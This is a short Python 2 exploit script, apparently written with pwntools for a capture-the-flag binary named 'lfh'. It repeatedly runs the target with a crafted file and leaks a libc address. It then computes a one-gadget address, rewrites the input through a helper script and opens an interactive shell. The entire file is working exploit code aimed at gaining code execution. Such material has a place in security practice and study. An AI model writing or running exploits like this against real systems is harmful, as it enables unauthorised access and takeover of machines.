#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1

file_path = "/tmp/webfang/BOOK"

while True:


    p = process("/home/lfh/lfh " + file_path + " 1", shell=True)

    try:
        p.recv()
        p.send("y")
        data = p.recvuntil("Y" * 16, timeout=1)
        addr = p.recv(6)
        if '\x7f' not in addr:
            continue
        p.recvuntil("program\n")
        mmap = u64(addr.ljust(8,"\x00"))
        print "addr: " + hex(mmap)
        mmap_base = mmap & 0xffffffffffff0000 + 0x7000
        libc_base = mmap_base - 0x968000
        print hex(libc_base)
        one = libc_base + 0x45390
        os.popen("python ./file_gen.py " + hex(one) + " 0")
	time.sleep(0.2)
	p.send("y")

        p.interactive()
    except:
        os.popen("python ./file_gen.py " + hex(0x401015) + " 1")
        p.close()
        continue
    
